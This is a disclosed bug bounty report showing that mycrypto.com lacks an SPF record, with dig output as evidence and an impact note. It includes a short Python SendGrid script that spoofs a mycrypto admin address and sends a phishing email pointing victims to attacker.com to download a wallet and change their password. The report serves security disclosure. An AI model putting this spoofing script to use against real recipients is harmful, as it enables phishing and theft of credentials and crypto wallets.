# Missing SPF record for the in scope domain

## Report Details
- **Report ID**: 325734
- **URL**: https://hackerone.com/reports/325734
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-03-13T20:47:42.611Z
- **Disclosed**: 2018-05-24T01:29:59.371Z

## Reporter
- **Username**: luciann
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mycrypto

## Vulnerability Information
```
nli@nlistation:~$ dig mycrypto.com txt

; <<>> DiG 9.10.3-P4-Ubuntu <<>> mycrypto.com txt
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 43571
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;mycrypto.com.			IN	TXT

;; AUTHORITY SECTION:
mycrypto.com.		10800	IN	SOA	ns-1945.awsdns-51.co.uk. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400

;; Query time: 37 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Tue Mar 13 22:37:32 EET 2018
;; MSG SIZE  rcvd: 125
```
Instead of: 

```
nli@nlistation:~$ dig gmail.com txt

; <<>> DiG 9.10.3-P4-Ubuntu <<>> gmail.com txt
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 19223
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;gmail.com.			IN	TXT

;; ANSWER SECTION:
gmail.com.		300	IN	TXT	"v=spf1 redirect=_spf.google.com"

;; Query time: 52 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Tue Mar 13 22:37:49 EET 2018
;; MSG SIZE  rcvd: 82

```
Where you can observe "v=spf1 redirect=_spf.google.com". Further more  this is a functional exploit for this issue (you still need an API key):

```
import sendgrid
import os
from sendgrid.helpers.mail import *
 
sg = sendgrid.SendGridAPIClient(apikey=os.environ.get('SENDGRID_API_KEY'))
from_email = Email("legit-admin@mycrypto.com")
to_email = Email("Your email")
subject = "Please Change your Password"
content = Content("text/plain", "Message From Admin ,Download Wallet from https://attacker.com, Change your password at https://attacker.com")
mail = Mail(from_email, subject, to_email, content)
response = sg.client.mail.send.post(request_body=mail.get())
print(response.status_code)
print(response.body)
print(response.headers)
```
You can also send from a web server or something else of your choosing.

## Impact

Missing SPF record for the in scope domain allows attackers to impersonate emails in order to send targeted phishing emails. This is rather common for ICO's or targeted attacks.

## Attachments
- Selection_040.png
- Selection_041.png
